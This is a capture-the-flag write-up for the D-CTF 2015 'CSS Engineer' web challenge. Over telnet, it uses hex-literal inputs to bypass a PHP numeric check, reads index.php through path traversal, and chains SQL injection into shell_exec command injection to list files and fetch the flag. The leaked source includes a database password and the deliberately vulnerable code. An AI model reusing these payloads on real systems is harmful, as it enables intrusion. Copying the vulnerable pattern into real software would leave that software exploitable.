## D-CTF 2015 - CSS Engineer (Web 400)
##### 02/10 - 04/10/2015 (36hr)
___

### Description:  
http://10.13.37.5
___
### Solution

We start by playing around with id and usr parameters. If we look at the source code we will see
a php file being the source of an image. Hmmmm how this code could be? the php should have something
like this:
```
    <?php
        header('Content-Type: image/jpeg');
        readfile('some_image.jpg');
    ?>
```

Let's use telnet to inspect what's going on:
```
root@vasilikoula:~/ctf/dctf# telnet 10.13.37.5 80
    Trying 10.13.37.5...
    Connected to 10.13.37.5.
    Escape character is '^]'.
    GET /?id=3&usr=1   

    cat: images/3_6.jpg: No such file or directory
    Connection closed by foreign host.
```
id=3 and usr=1 is trying to open image 3_6.jpg. After a while we find the pattern:
id is the first part of the file name. Then an underscore follows and finally a number
which depends on usr:
```
    switch( usr )
    {
    	case 1: name .= "6.jpg"
    	case 2: name .= "267.jpg"
    	case 3: name .= "269.jpg"
    	case 4: name .= "271.jpg"
    }
```
We can't do much with usr, so we should focus on id. Lets start "fuzzing" it: 
```
    (echo -e "GET /?id=999999999999999&usr=1 HTTP/1.0\n\n"; sleep 0.5) | telnet 10.13.37.5 80
```
The above command returns the error:
    images/999999999999999_6.jpg: No such file or directory

Id parameter is "reflected". However id must be numeric. If we supply an non-numeric value, we'll
get the error "ID or User ID must be numeric". However if we supply hex literals we'll some 
interesting things:
```
root@vasilikoula:~/ctf/dctf# (echo -e "GET /?id=0x3336&usr=1 HTTP/1.0\n\n"; sleep 0.5) 
                            | telnet 10.13.37.5 80
    Trying 10.13.37.5...
    Connected to 10.13.37.5.
    Escape character is '^]'.
    HTTP/1.1 200 OK
    Date: Sun, 04 Oct 2015 03:57:13 GMT
    Server: Apache/2.4.7 (Ubuntu)
    X-Powered-By: PHP/5.5.9-1ubuntu4.13
    Content-Length: 48
    Connection: close
    Content-Type: image/jpeg

    cat: images/36_6.jpg: No such file or directory
    Connection closed by foreign host.
```
Ok, got the point. Let's read index.php: "../index.php" -> 0x2e2e2f696e6465782e70687000
```
root@vasilikoula:~/ctf/dctf# (echo -e "GET /?id=0x2e2e2f696e6465782e70687000&usr=1 HTTP/1.0\n\n"; sleep 0.5) 
                            | telnet 10.13.37.5 80
Trying 10.13.37.5...
Connected to 10.13.37.5.
Escape character is '^]'.
HTTP/1.1 200 OK
Date: Sun, 04 Oct 2015 03:58:19 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.13
Connection: close
Content-Type: image/jpeg
WmzWZmPH7PZJtxOyff[..... TRUNCATED FOR BREVITY .....]Ugo5KtCkuSv8AAF
```
```
<?php

// ini_set('display_errors',1);
// error_reporting(E_ALL);

mysql_connect('localhost','w400', 'lajsflkjaslfjasklfj10412497128') or die('neah');
mysql_select_db('w400');

if(isset($_GET['id'], $_GET['usr'])) {

    if(!is_numeric($_GET['id']) || !is_numeric($_GET['usr'])) {
        die('ID or User ID must be numeric, obviously. Cheers from Bucharest, awesome girls, smoke free. :-) <br><img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABA[..... TRUNCATED FOR BREVITY .....]1zPsUtJJokWJn/2Q==">');
    }

    $q = mysql_query('SELECT concat('.$_GET['id'].',"_",image) as path FROM images WHERE id="'.$_GET['usr'].'"');
    $path = mysql_result($q, 0);

    header('Content-Type: image/jpeg');
    echo shell_exec("cat images/$path 2>&1");
} else {
    echo '<h1>List of some users! I don\'t know CSS! :(</h1>';
    $q = mysql_query('SELECT * FROM `images`');
    while($row = mysql_fetch_array($q)) {
        echo '<h3>'.$row['user'].'</h3>';
        echo '<img src="?id='.$row['id'].'&usr='.$row['id'].'">';
    }
}
cNYXndfWopzZp0Hwl[..... TRUNCATED FOR BREVITY .....]JEnxqUZ8rXH9thbbeetl5
Connection closed by foreign host.
```

We have the code now. The interesting part is the following lines:
```
    q = mysql_query('SELECT concat('.$_GET['id'].',"_",image) as path FROM images WHERE id="'.$_GET['usr'].'"');
    $path = mysql_result($q, 0);

    echo shell_exec("cat images/$path 2>&1");
```

If we supply and id with spaces the result will be the following:
```
root@vasilikoula:~/ctf/dctf# (echo -e "GET /?id=0x61206220632064&usr=2 HTTP/1.0\n\n"; sleep 0.5) 
                | telnet 10.13.37.5 80
    Trying 10.13.37.5...
    Connected to 10.13.37.5.
    Escape character is '^]'.
    HTTP/1.1 200 OK
    Date: Sun, 04 Oct 2015 04:13:33 GMT
    Server: Apache/2.4.7 (Ubuntu)
    X-Powered-By: PHP/5.5.9-1ubuntu4.13
    Content-Length: 151
    Connection: close
    Content-Type: image/jpeg

    cat: images/a: No such file or directory
    cat: b: No such file or directory
    cat: c: No such file or directory
    cat: d_267.jpg: No such file or directory
    Connection closed by foreign host.
```
The multiple files is a consequence of cat command. Now we can manipulate $path which means that 
we can execute arbitrary commands :)

Let's execute an ls: "foo; ls -la"
```
root@vasilikoula:~/ctf/dctf# (echo -e "GET /?id=0x666f6f3b206c73202d6c6100&usr=2 HTTP/1.0\n\n"; 
                        sleep 0.5) | telnet 10.13.37.5 80
    Trying 10.13.37.5...
    Connected to 10.13.37.5.
    Escape character is '^]'.
    HTTP/1.1 200 OK
    Date: Sun, 04 Oct 2015 04:16:22 GMT
    Server: Apache/2.4.7 (Ubuntu)
    X-Powered-By: PHP/5.5.9-1ubuntu4.13
    Content-Length: 330
    Connection: close
    Content-Type: image/jpeg

    total 44
    drwxr-xr-x 3 root root  4096 Oct  3 16:15 .
    drwxr-xr-x 3 root root  4096 Oct  1 22:08 ..
    -rw-r--r-- 1 root root    17 Oct  1 22:20 .htaccess
    -rw-r--r-- 1 root root    38 Oct  1 22:14 6e8218531e0580b6754b3e3be5252873.txt
    drwxrwxr-x 2 root root  4096 Oct  1 22:14 images
    -rw-r--r-- 1 root root 21392 Oct  1 22:17 index.php
    Connection closed by foreign host.
```
All we have to do is to access that strange file:

http://10.13.37.5/6e8218531e0580b6754b3e3be5252873.txt


**DCTF{19b1f9f19688da85ec52a735c8da0dd3}**
___